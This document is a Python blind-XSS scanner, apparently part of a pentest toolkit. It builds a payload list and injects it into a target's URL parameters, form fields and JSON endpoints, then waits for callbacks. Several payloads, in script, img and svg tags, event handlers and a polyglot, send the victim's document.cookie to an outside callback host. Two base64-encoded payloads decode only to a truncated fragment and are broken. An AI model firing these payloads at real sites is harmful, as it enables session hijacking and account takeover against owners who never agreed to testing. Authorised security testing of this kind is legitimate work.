#!/usr/bin/env python3
"""
Blind XSS Scanner
Tests for XSS that executes in different contexts (admin panels, logs, emails, etc.)
"""

import requests
import argparse
import json
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init
from datetime import datetime
import time
import sys
import os

# Add parent directory to path
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tools.callback_server import CallbackServer

init(autoreset=True)


class BlindXSSScanner:
    """Scanner for detecting Blind XSS vulnerabilities"""
    
    def __init__(self, callback_url, output_dir='results'):
        """
        Initialize Blind XSS scanner
        
        Args:
            callback_url: Callback URL for XSS payloads
            output_dir: Directory to save results
        """
        self.callback_url = callback_url
        self.output_dir = output_dir
        self.vulnerabilities = []
        self.tested_inputs = []
        
        # Generate payloads
        self.payloads = self._generate_payloads()
    
    def _generate_payloads(self):
        """Generate blind XSS payloads"""
        base_payloads = []
        
        # Script tag payloads
        base_payloads.extend([
            f'<script src="{self.callback_url}/xss.js"></script>',
            f'<script>fetch("{self.callback_url}/xss?c="+document.cookie)</script>',
            f'<script>var i=new Image();i.src="{self.callback_url}/xss?c="+document.cookie;</script>',
            '<script>eval(atob("ZmV0Y2goImh0dHA6Ly8="))</script>',
        ])
        
        # IMG tag payloads
        base_payloads.extend([
            f'<img src=x onerror="fetch(\'{self.callback_url}/xss\')">',
            f'<img src=x onerror="eval(atob(\'ZmV0Y2goImh0dHA6Ly8=\'))">',
            f'<img src="{self.callback_url}/xss.png">',
        ])
        
        # SVG payloads
        base_payloads.extend([
            f'<svg onload="fetch(\'{self.callback_url}/xss\')">',
            f'<svg><script>fetch("{self.callback_url}/xss")</script></svg>',
        ])
        
        # Event handler payloads
        base_payloads.extend([
            f'" onfocus="fetch(\'{self.callback_url}/xss\')" autofocus="',
            f'" onmouseover="fetch(\'{self.callback_url}/xss\')" ',
            f'\' onclick="fetch(\'{self.callback_url}/xss\')" \'',
        ])
        
        # Polyglot payloads (work in multiple contexts)
        base_payloads.extend([
            f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=fetch("{self.callback_url}/xss") )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=fetch("{self.callback_url}/xss")//\\x3e',
            f'\'"><script src={self.callback_url}/xss.js></script>',
        ])
        
        # Markdown/BBCode injection (for forums, comments)
        base_payloads.extend([
            f'[img]{self.callback_url}/xss.png[/img]',
            f'![xss]({self.callback_url}/xss.png)',
        ])
        
        # JSON injection
        base_payloads.extend([
            f'{{"test":"<script src={self.callback_url}/xss.js></script>"}}',
        ])
        
        # Template injection
        base_payloads.extend([
            f'{{{{7*7}}}}<script src={self.callback_url}/xss.js></script>',
        ])
        
        return base_payloads
    
    def _make_request(self, url, method='GET', data=None, json_data=None, headers=None):
        """Make HTTP request"""
        try:
            req_headers = headers or {}
            
            if method.upper() == 'GET':
                response = requests.get(url, timeout=10)
            elif method.upper() == 'POST':
                if json_data:
                    response = requests.post(url, json=json_data, headers=req_headers, timeout=10)
                else:
                    response = requests.post(url, data=data, headers=req_headers, timeout=10)
            else:
                return None
            
            return response
        except Exception as e:
            return None
    
    def test_form(self, url, form_data):
        """Test a form for blind XSS"""
        print(f"\n{Fore.CYAN}[*] Testing form at: {url}{Style.RESET_ALL}")
        
        # Test each payload
        for i, payload in enumerate(self.payloads[:10], 1):  # Limit to 10 payloads
            print(f"  Testing payload {i}/{min(10, len(self.payloads))}...", end='\r')
            
            # Inject payload into each form field
            for field in form_data.keys():
                test_data = form_data.copy()
                test_data[field] = payload
                
                # Make request
                response = self._make_request(url, 'POST', data=test_data)
                
                if response:
                    # Store tested input
                    self.tested_inputs.append({
                        'url': url,
                        'field': field,
                        'payload': payload,
                        'timestamp': datetime.now().isoformat()
                    })
                
                # Small delay
                time.sleep(0.3)
        
        print(f"  {Fore.GREEN}Tested {min(10, len(self.payloads))} payloads{Style.RESET_ALL}")
    
    def test_url_parameters(self, url):
        """Test URL parameters for blind XSS"""
        print(f"\n{Fore.CYAN}[*] Testing URL parameters: {url}{Style.RESET_ALL}")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            print(f"{Fore.YELLOW}[-] No URL parameters found{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Found {len(params)} parameter(s){Style.RESET_ALL}")
        
        # Test each parameter
        for param in params.keys():
            print(f"  Testing parameter: {param}")
            
            for payload in self.payloads[:5]:  # Limit to 5 payloads per parameter
                test_params = params.copy()
                test_params[param] = [payload]
                
                # Build test URL
                from urllib.parse import urlencode, urlunparse
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                
                # Make request
                response = self._make_request(test_url)
                
                if response:
                    self.tested_inputs.append({
                        'url': test_url,
                        'parameter': param,
                        'payload': payload,
                        'timestamp': datetime.now().isoformat()
                    })
                
                time.sleep(0.3)
    
    def test_json_endpoint(self, url, json_template):
        """Test JSON endpoint for blind XSS"""
        print(f"\n{Fore.CYAN}[*] Testing JSON endpoint: {url}{Style.RESET_ALL}")
        
        headers = {'Content-Type': 'application/json'}
        
        # Test each field in JSON
        for field in json_template.keys():
            print(f"  Testing field: {field}")
            
            for payload in self.payloads[:5]:
                test_json = json_template.copy()
                test_json[field] = payload
                
                response = self._make_request(url, 'POST', json_data=test_json, headers=headers)
                
                if response:
                    self.tested_inputs.append({
                        'url': url,
                        'field': field,
                        'payload': payload,
                        'method': 'POST (JSON)',
                        'timestamp': datetime.now().isoformat()
                    })
                
                time.sleep(0.3)
    
    def wait_for_callbacks(self, duration=60):
        """Wait for callbacks and check results"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Waiting for Callbacks{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[*] Waiting {duration} seconds for callbacks...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Blind XSS may trigger later in admin panels, logs, or emails{Style.RESET_ALL}\n")
        
        start_time = time.time()
        while time.time() - start_time < duration:
            remaining = int(duration - (time.time() - start_time))
            print(f"  Time remaining: {remaining}s", end='\r')
            time.sleep(1)
        
        print(f"\n{Fore.GREEN}[+] Callback waiting period complete{Style.RESET_ALL}")
    
    def save_results(self, target):
        """Save scan results"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{self.output_dir}/{target.replace('://', '_').replace('/', '_')}_blind_xss_{timestamp}.json"
        
        results = {
            'target': target,
            'scan_date': datetime.now().isoformat(),
            'callback_url': self.callback_url,
            'total_inputs_tested': len(self.tested_inputs),
            'tested_inputs': self.tested_inputs,
            'note': 'Check callback server for received callbacks. Blind XSS may trigger hours or days later.'
        }
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Results saved to: {filename}{Style.RESET_ALL}")
        return filename
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Blind XSS Scan Summary{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}[+] Tested {len(self.tested_inputs)} input(s) with blind XSS payloads{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Callback URL: {self.callback_url}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[!] Important:{Style.RESET_ALL}")
        print(f"  - Blind XSS may trigger later (hours or days)")
        print(f"  - Check your callback server regularly")
        print(f"  - Monitor admin panels, logs, emails, and reports")
        print(f"  - Keep callback server running for extended period")


def main():
    """Main function for CLI usage"""
    parser = argparse.ArgumentParser(description='Blind XSS Scanner - Test for XSS in admin panels, logs, emails')
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-c', '--callback', help='Callback URL (or use --start-server)')
    parser.add_argument('-s', '--start-server', action='store_true', help='Start local callback server')
    parser.add_argument('-p', '--port', type=int, default=8080, help='Port for callback server (default: 8080)')
    parser.add_argument('-w', '--wait', type=int, default=60, help='Seconds to wait for callbacks (default: 60)')
    parser.add_argument('-o', '--output', default='results', help='Output directory')
    
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}╔═══════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║       Blind XSS Vulnerability Scanner        ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║   Tests for XSS in Admin Panels, Logs, etc.  ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚═══════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    # Setup callback server if requested
    callback_url = args.callback
    server = None
    
    if args.start_server:
        server = CallbackServer(port=args.port, output_dir=args.output)
        server.start_background()
        callback_url = server.get_callback_url()
        time.sleep(1)  # Give server time to start
    
    if not callback_url:
        print(f"{Fore.RED}[!] Error: Provide --callback URL or use --start-server{Style.RESET_ALL}")
        return
    
    # Run scanner
    scanner = BlindXSSScanner(callback_url=callback_url, output_dir=args.output)
    
    # Test URL parameters
    scanner.test_url_parameters(args.url)
    
    # Wait for callbacks
    scanner.wait_for_callbacks(duration=args.wait)
    
    # Print summary
    scanner.print_summary()
    scanner.save_results(args.url)
    
    # Stop server if we started it
    if server:
        server.print_summary()
        server.stop()


if __name__ == '__main__':
    main()
